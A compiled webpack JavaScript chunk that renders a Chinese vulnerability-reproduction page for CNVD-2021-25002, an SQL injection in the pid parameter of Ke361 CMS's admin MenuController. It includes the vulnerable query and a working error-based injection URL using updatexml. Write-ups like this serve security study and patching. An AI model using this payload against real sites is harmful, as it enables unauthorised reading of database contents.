(window.webpackJsonp=window.webpackJsonp||[]).push([[195],{1130:function(t,s,a){t.exports=a.p+"assets/img/1634130579841-e981591e-46f6-4aa8-bc68-6fe39d1e4e35-20220313232948253.b730640f.png"},1131:function(t,s,a){t.exports=a.p+"assets/img/1634136475760-256dded1-8bef-40a2-b391-e3a84bd7fcc2.39a27f2a.png"},1132:function(t,s,a){t.exports=a.p+"assets/img/1634140622931-bdc55324-f405-4708-8973-4fef07eeac8e.e32aa548.png"},2996:function(t,s,a){"use strict";a.r(s);var n=a(63),e=Object(n.a)({},(function(){var t=this,s=t._self._c;return s("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[s("h1",{attrs:{id:"ke361-menucontroller-class-php-后台sql注入漏洞-cnvd-2021-25002"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#ke361-menucontroller-class-php-后台sql注入漏洞-cnvd-2021-25002"}},[t._v("#")]),t._v(" Ke361 MenuController.class.php 后台SQL注入漏洞 CNVD-2021-25002")]),t._v(" "),s("h2",{attrs:{id:"漏洞描述"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[t._v("#")]),t._v(" 漏洞描述")]),t._v(" "),s("p",[t._v("Ke361 MenuController.class.php文件 index() 函数中的pid参数存在 SQL注入漏，导致攻击者通过漏洞可以获取数据库敏感信息")]),t._v(" "),s("h2",{attrs:{id:"漏洞影响"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[t._v("#")]),t._v(" 漏洞影响")]),t._v(" "),s("a-checkbox",{attrs:{checked:""}},[t._v("Ke361")]),s("br"),t._v(" "),s("h2",{attrs:{id:"环境搭建"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#环境搭建"}},[t._v("#")]),t._v(" 环境搭建")]),t._v(" "),s("a-checkbox",{attrs:{checked:""}},[t._v("https://gitee.com/jcove/ke361")]),s("br"),t._v(" "),s("h2",{attrs:{id:"漏洞复现"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[t._v("#")]),t._v(" 漏洞复现")]),t._v(" "),s("p",[t._v("CMS产品页面")]),t._v(" "),s("p",[s("img",{attrs:{src:a(1130),alt:"img"}})]),t._v(" "),s("p",[t._v("存在漏洞的文件为 "),s("code",[t._v("Application/Admin/Controller/MenuController.class.php")])]),t._v(" "),s("p",[s("img",{attrs:{src:a(1131),alt:"img"}})]),t._v(" "),s("p",[t._v("Get 传参 pid 传入SQL语句")]),t._v(" "),s("div",{staticClass:"language-php line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-php"}},[s("code",[s("span",{pre:!0,attrs:{class:"token constant"}},[t._v("SELECT")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token string backtick-quoted-string"}},[t._v("`id`")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),s("span",{pre:!0,attrs:{class:"token string backtick-quoted-string"}},[t._v("`title`")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),s("span",{pre:!0,attrs:{class:"token string backtick-quoted-string"}},[t._v("`pid`")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),s("span",{pre:!0,attrs:{class:"token string backtick-quoted-string"}},[t._v("`sort`")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),s("span",{pre:!0,attrs:{class:"token string backtick-quoted-string"}},[t._v("`url`")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),s("span",{pre:!0,attrs:{class:"token string backtick-quoted-string"}},[t._v("`hide`")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),s("span",{pre:!0,attrs:{class:"token string backtick-quoted-string"}},[t._v("`tip`")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),s("span",{pre:!0,attrs:{class:"token string backtick-quoted-string"}},[t._v("`group`")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),s("span",{pre:!0,attrs:{class:"token string backtick-quoted-string"}},[t._v("`is_dev`")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),s("span",{pre:!0,attrs:{class:"token string backtick-quoted-string"}},[t._v("`status`")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token constant"}},[t._v("FROM")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token string backtick-quoted-string"}},[t._v("`ke_menu`")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("WHERE")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("id"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n")])]),t._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[t._v("1")]),s("br")])]),s("p",[t._v("使用括号闭合语句，构造SQL注入")]),t._v(" "),s("div",{staticClass:"language-php line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-php"}},[s("code",[s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("admin"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),t._v("php"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("?")]),t._v("s"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("Menu"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("index"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("pid"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("20")]),t._v("AND"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("20")]),t._v("updatexml"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("concat")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("0x7e")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("select"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("20")]),t._v("md5"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("0x7e")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("--")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),t._v("\n")])]),t._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[t._v("1")]),s("br")])]),s("p",[s("img",{attrs:{src:a(1132),alt:"img"}})])],1)}),[],!1,null,null,null);s.default=e.exports}}]);